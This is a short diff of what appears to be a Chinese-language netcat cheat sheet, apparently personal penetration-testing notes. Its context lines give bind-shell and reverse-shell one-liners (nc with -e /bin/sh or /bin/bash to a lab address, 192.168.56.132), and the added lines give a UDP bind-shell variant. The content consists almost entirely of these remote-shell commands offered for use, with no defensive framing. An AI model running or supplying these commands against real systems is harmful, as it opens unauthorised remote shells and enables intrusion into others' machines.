@@ -73,6 +73,10 @@ nc -lvvp 6666 -e /bin/sh   主动shell
 
 nc 192.168.56.132 6666  攻击机联
 
+## udp  通讯
+nc -lvvp 6666 -u -e  /bin/sh
+nc -u 192.168.56.132 6666 
+
 ## 反弹shell
 nc 192.168.56.132 4444 -e /bin/bash    被攻击主动的联 132
 nc -lp 4444     攻击机可以处理
